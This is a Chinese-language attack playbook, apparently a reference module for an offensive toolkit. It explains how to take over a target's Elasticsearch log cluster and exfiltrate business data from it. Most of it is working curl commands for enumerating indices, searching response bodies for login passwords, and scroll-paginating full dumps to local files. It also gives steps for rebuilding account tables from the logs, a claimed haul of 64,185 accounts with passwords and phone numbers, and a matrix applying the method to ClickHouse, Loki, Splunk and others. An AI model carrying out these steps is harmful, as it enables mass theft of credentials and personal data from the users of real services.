# 日志库接管 → 按字段锚定拖业务数据

## 0. 为什么这是最短路径

业务应用普遍做得不错（EF Core 全参数化、鉴权无死角、JWT 无支点），但**日志采集是最不受重视的一环**：

- 全量 API 流量落库：`requestBody` / `responseBody` / `requestHeaders` / `responseHeaders`；
- 附带 `userName` / `clientIp` / `serverIp` / `sql` 字段。

⇒ **日志库 = 数据库镜像 + 明文口令 + 活 token + SQL 审计**。打不动业务库时，打日志库。

## 1. 接管与盘点

```bash
ES=https://es.<域名>; AUTH="-u elastic:<P>"
curl -sk $AUTH "$ES/_cluster/health?pretty"                    # 先确认能进
curl -sk $AUTH "$ES/_cat/indices?v&h=index,docs.count,store.size&s=store.size:desc" | head -40
curl -sk $AUTH "$ES/_cat/nodes?v"                              # 节点数 / 版本 / 内网 IP
curl -sk $AUTH "$ES/_cat/aliases?v"                            # ILM rollover 后的真索引名
curl -sk $AUTH "$ES/_cluster/health?level=indices&pretty"      # 哪些索引还在写
```

- 索引命名模式：`<app>-logs-YYYY.MM.DD`（按天分片）、`system-api-logs`（全站流量）、`<app>-logs-*`。
- **必须枚举全量索引再抽样**：只猜几个日期会漏掉 99%；rollover 后真名要看 `_cat/aliases`。
- 先按体量排序，优先最大且名字像"流量/API"的索引（不是 `*-metrics` / `*-access` 这类低价值索引）。

## 2. 抽样看字段（先 1 条，别先跑全量）

```bash
curl -sk $AUTH "$ES/<index>/_search?size=1&pretty"
curl -sk $AUTH "$ES/<index>/_mapping?pretty"
```
- `text` 字段才能 `match_phrase`；`keyword` 用 `term`；字符串化的 JSON body 直接 `match_phrase` 子串。
- Kibana 同口令时用 Discover / Stack Management 看字段列表，比猜快一个数量级。
- 抽到的字段清单决定后续 `_source` 白名单（省 90% 传输量）。

## 3. 定位业务数据（字段锚定，不用裸正则）

```bash
curl -sk $AUTH -X POST "$ES/system-api-logs/_search?size=3&pretty" -H 'Content-Type: application/json' -d '{
  "query": {"match_phrase": {"responseBody": "loginPassword"}},
  "_source": ["requestUrl","requestBody","responseBody","@timestamp"]
}'
```
- 用**独一无二的业务字段名**当锚（`loginPassword` / `emailAddress` / `orderNo`），不要用正则漫天抓（会掺 ID 子串假阳性）。
- 用 `requestUrl` 聚合出**完整接口表**（日志里成段是"接口 URL + 状态码 + 返回文案"）——比 fuzz 路径快得多，还能发现 JS 里没暴露的内部端点：
  ```bash
  curl -sk $AUTH -X POST "$ES/system-api-logs/_search?size=0" -H 'Content-Type: application/json' \
    -d '{"aggs":{"u":{"terms":{"field":"requestUrl","size":200}}},"_source":false}'
  ```

## 4. 全量分页（`from/size` 只到 10000）

```bash
# 方式 A：scroll（ES 7.x 通用，最简单）
curl -sk $AUTH -X POST "$ES/<idx>/_search?scroll=5m&size=2000" -H 'Content-Type: application/json' \
  -d '{"query":{"match_phrase":{"responseBody":"loginPassword"}},"_source":["responseBody"]}'
# 拿到 _scroll_id 后循环
curl -sk $AUTH -X POST "$ES/_search/scroll" -H 'Content-Type: application/json' \
  -d '{"scroll":"5m","scroll_id":"<ID>"}'
# 方式 B：PIT + search_after（7.10+ 推荐，可并行、不吃 scroll 上下文）
```
- **`scroll_id` 落盘**，可断点续跑；每批 append 到本地 JSONL，别在内存里堆 400GB 的结果。
- 结束条件明确：`hits.hits` 为空 → 收尾并清理自己的 scroll 上下文（`DELETE /_search/scroll`）。
- 限速与并发：单 stream 并发 4–8、按索引分片并行；经跳板机出口，别把目标 ES 打崩（打崩了就没数据了）。

## 5. 从日志体还原业务表（三个必踩坑）

日志里的 body 是**字符串化的 JSON**：

1. **转义**：`{\"emailAddress\":\"...\"}` → 先 `json.loads` 外层日志，再对 body 字符串二次 `json.loads`。
2. **截断**：采集器常有 `max_length`（响应体被切一半，`json.loads` 直接失败）→ 换更小的接口响应体，或用分页参数把数据切小；截断的行要**计数并单列**，别静默丢。
3. **嵌套/聚合**：一条日志可能含数组（批量接口一次返回 N 个对象）→ 递归展开，不要只取第一条。

抽完后**必须对账**：

```
唯一业务主键数 vs 解析出的条数；解析失败条数单独统计
(总条数 − 唯一数)/总条数 ≠ 0 时先怀疑：解析漏 or 分页重复 or 索引没枚举全
```
> 实测一次通过日志响应体还原出 **64,185 条业务账号**（52,407 活号），字段：邮箱 / 登录口令 / 绑定手机 / 封禁状态。
> **交付物是业务字段，不是"集群 587 索引 / 27 亿文档 / 1.6TB"这种环境数字。**

## 6. 迁移矩阵（同一方法论，换存储）

| 存储 | 判据 | 查询入口 |
|---|---|---|
| Elasticsearch | 9200 / 401 + `security_exception` | `_search` + `_scroll` |
| Kibana | 5601 / `/api/status` | Discover 确认字段，导出走 ES |
| ClickHouse | 8123 `/ping`、`?query=SHOW%20TABLES` | HTTP 直接 SQL（未授权常见） |
| Loki / Grafana | 3100 `/loki/api/v1/labels` | `query_range` 按时间窗拉 |
| 阿里云 SLS | 见 `cloud-credential-leak-exploitation/references/aliyun-sls.md` | GetLogs + 签名 |
| Splunk / Graylog / Sentry | Web 搜索接口 | 先用 UI 摸字段名 |

## 7. 纪律与反模式

- 只读：`_search` / `_scroll` / UI 浏览。**不删索引、不改 ILM、不写文档**（写 = 污染目标审计）。
- 出货前先抽样 1–2 条给用户确认结构，再跑全量；全量限速、进度落文件、可随时喊停。
- 反模式：把集群规模当成果；用裸正则抓 PII；不分页直接 `from:50000`（被 `index.max_result_window` 截断后误判"数据只有 10000 条"）。
- 报告里注明时间窗与命中索引（痕迹说明）。
